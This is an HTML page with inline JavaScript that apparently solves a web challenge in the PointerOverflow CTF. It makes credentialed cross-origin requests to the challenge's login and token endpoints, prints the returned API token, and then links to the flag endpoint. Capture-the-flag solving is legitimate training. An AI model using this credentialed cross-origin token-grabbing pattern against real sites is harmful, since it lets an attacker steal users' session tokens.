<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>PointerOverflow CTF - Token Capture</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: system-ui, sans-serif; margin: 2rem; }
    button { margin: 0.5rem 0; padding: 0.5rem 1rem; }
    pre { background: #f0f0f0; padding: 1rem; }
  </style>
</head>
<body>
  <h1>PointerOverflow CTF</h1>

  <button id="loginBtn">Login</button>
  <button id="tokenBtn" disabled>Fetch Token</button>
  <p>After fetching the token, click the link below to open the flag in a new tab.</p>
  <a id="flagLink" href="https://web200-1.pointeroverflowctf.com/api/flag" target="_blank" style="display:none">Go to Flag</a>

  <pre id="output"></pre>

  <script>
    const loginBtn = document.getElementById('loginBtn');
    const tokenBtn = document.getElementById('tokenBtn');
    const flagLink = document.getElementById('flagLink');
    const output = document.getElementById('output');

    const log = msg => {
      console.log(msg);
      output.textContent += msg + "\n";
    };

    loginBtn.onclick = async () => {
      loginBtn.disabled = true;
      log("Logging in...");

      const loginRes = await fetch('https://web200-1.pointeroverflowctf.com/login', {
        method: 'POST',
        credentials: 'include'
      });

      const loginData = await loginRes.json();
      log("Login: " + JSON.stringify(loginData));

      if (loginData.ok) {
        log("Session cookie set. You can now fetch the token.");
        tokenBtn.disabled = false;
      } else {
        log("Login failed.");
        loginBtn.disabled = false;
      }
    };

    tokenBtn.onclick = async () => {
      tokenBtn.disabled = true;
      log("Fetching token...");

      const tokenRes = await fetch('https://web200-1.pointeroverflowctf.com/api/token', {
        method: 'GET',
        credentials: 'include'
      });

      const tokenData = await tokenRes.json();
      log("Token: " + tokenData.apiToken);

      log("Token retrieved. Click the link below to open /api/flag in a new tab.");
      flagLink.style.display = 'inline';
    };
  </script>
</body>
</html>
